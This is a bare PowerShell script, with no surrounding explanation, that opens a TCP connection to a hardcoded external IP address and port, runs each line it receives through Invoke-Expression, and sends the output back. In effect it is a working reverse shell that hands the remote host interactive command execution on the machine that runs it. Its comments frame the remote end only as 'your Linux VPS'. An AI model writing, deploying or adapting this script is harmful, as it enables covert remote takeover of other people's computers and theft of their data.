# Establish a TCP connection to your Linux VPS
$client = New-Object System.Net.Sockets.TCPClient("62.72.26.25", 6000);
$stream = $client.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$reader = new-object System.IO.StreamReader($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;

# Send an initial prompt
$writer.Write($encoding.GetBytes("PS " + (pwd).Path + "> "));
$writer.Flush();

# Continuously read and execute commands from the Linux VPS
while($true) {
    try {
        $data = $reader.ReadLine();
        if ($data) {
            # Execute the command and capture the output
            $sendback = (iex $data 2>&1 | Out-String);
            $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
            # Send the output back to the Linux VPS
            $writer.Write($encoding.GetBytes($sendback2), 0, $sendback2.Length);
            $writer.Flush();
        }
    } catch {
        # Close the connection if an error occurs
        $writer.Close();
        $client.Close();
        break;
    }
}
